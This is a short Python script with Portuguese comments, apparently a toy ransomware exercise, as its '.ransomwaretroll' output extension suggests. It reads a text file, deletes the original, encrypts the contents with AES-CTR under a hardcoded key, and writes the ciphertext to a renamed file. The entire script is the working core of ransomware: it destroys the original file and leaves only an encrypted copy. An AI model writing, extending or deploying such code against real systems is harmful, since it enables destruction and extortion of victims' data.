import os
import pyaes

# CRIPTAR O ARQUIVO TXT
arquivo_nome = "arquivo.txt"
arquivo = open(arquivo_nome, "rb")
arquivo_dados = arquivo.read()
arquivo.close()

#REMOVE O ARQUIVO
os.remove(arquivo_nome)

#CHAVE DE ENCRYPTAÇÃO
key = b"0123456789abcdef0123456789abcdef"
aes = pyaes.AESModeOfOperationCTR(key)
encrypted_data = aes.encrypt(arquivo_dados)

#CRIAR UM NOVO ARQUIVO TXT COM O CONTEÚDO CRIPTADO
arquivo_novo = arquivo_nome + '.ransomwaretroll'
arquivo_novo = open(arquivo_novo, "wb")
arquivo_novo.write(encrypted_data)
arquivo_novo.close()